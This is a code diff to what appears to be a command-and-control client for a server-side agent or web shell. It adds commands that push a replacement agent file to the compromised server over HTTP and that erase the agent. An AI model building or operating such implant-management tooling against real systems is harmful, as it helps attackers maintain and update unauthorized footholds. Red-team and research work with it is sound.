@@ -8,10 +8,10 @@ from lib.shell import get_input, log_command
 from lib.argparser import generate_argparser
 from lib.printer import print_info, print_warning, print_error, print_error_args
 from lib.printer import format_info, format_warning, format_error
-from lib.common import unpack_fields, hex2bin, bin2hex, find_module
+from lib.common import unpack_fields, hex2bin, bin2hex, find_module, file_exists, read_file
 from lib.common import create_temporal_directory, parse_agent_response_data
 from lib.config import DEFAULT_TOKEN_VALUE, ALL_MODULES
-from lib.config import ACTION_STATUS, ACTION_LOAD, ACTION_INVOKE, ACTION_UNLOAD, ACTION_CLEAN
+from lib.config import ACTION_STATUS, ACTION_LOAD, ACTION_INVOKE, ACTION_UNLOAD, ACTION_CLEAN, ACTION_UPDATE, ACTION_DELETE
 from lib.config import SUCCESS_RESPONSE_CODE, FAILED_RESPONSE_CODE
 from lib.config import COMMAND_CHANGE_DIRECTORY, COMMAND_EXIT, COMMAND_HELP, COMMAND_REV2SELF, COMMAND_RECOMPILE, COMMAND_INFO, COMMAND_LOGGING
 from lib.config import C2_COMMAND_LIST_MODULES, C2_COMMAND_REFRESH_MODULES, C2_COMMAND_LOAD_MODULE, C2_COMMAND_UNLOAD_MODULE, C2_COMMAND_CLEAN_MODULES
@@ -299,6 +299,37 @@ class CustomClient(Client):
         self.agent_modules.clear()
         print_info("Clean modules from agent successfully")
         print()
+        return
+
+    def do_update(self, new_agent_filepath):
+        if not file_exists(new_agent_filepath):
+            raise CoreException(f"New Agent filepath to update. '{new_agent_filepath}' not exists")
+
+        opt = input(format_warning(f"This action will update current agent deployed with file: '{new_agent_filepath}' contents. Are you sure? (y/n): "))
+        if (opt != "y") and (opt != "Y"):
+            return
+        
+        new_agent_data = read_file(new_agent_filepath)
+        new_agent_data = bin2hex(new_agent_data.encode())
+
+        action = f"action={ACTION_UPDATE},data={new_agent_data}"
+        response = self.httpclient.do_http_request(action)
+        status, message = parse_agent_response_data(response)
+        if status == FAILED_RESPONSE_CODE:
+            raise CoreException(message)
+        print_info(message)
+        return
+
+    def do_delete(self):
+        opt = input(format_warning("This action will erase agent from server. Do you really want to delete it? (y/n): "))
+        if (opt != "y") and (opt != "Y"):
+            return
+        action = f"action={ACTION_DELETE}"
+        response = self.httpclient.do_http_request(action)
+        status, message = parse_agent_response_data(response)
+        if status == FAILED_RESPONSE_CODE:
+            raise CoreException(message)
+        print_info(message)
         return
 
     def prompt(self):
